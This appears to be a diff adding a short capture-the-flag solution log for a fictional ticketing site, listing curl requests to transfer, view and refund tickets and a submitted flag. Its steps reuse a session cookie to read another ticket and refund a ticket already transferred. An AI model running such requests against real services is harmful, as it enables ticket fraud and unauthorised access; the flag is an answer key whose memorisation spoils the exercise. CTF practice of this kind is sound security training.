@@ -1,0 +1,8 @@
+# Season 7, mission 2: one seat for two
+curl https://billetterie.lumierenoire.test/transfert
+curl -d "billet=7102" https://billetterie.lumierenoire.test/transfert
+curl -b "session=ln_k7_4f2a" https://billetterie.lumierenoire.test/billets/7140
+curl -d "billet=7102" https://billetterie.lumierenoire.test/remboursement
+submit FLAG{lumiere-two-for-none-93c7}
+review dossier/tickets.txt
+review dossier/tickets.txt 5
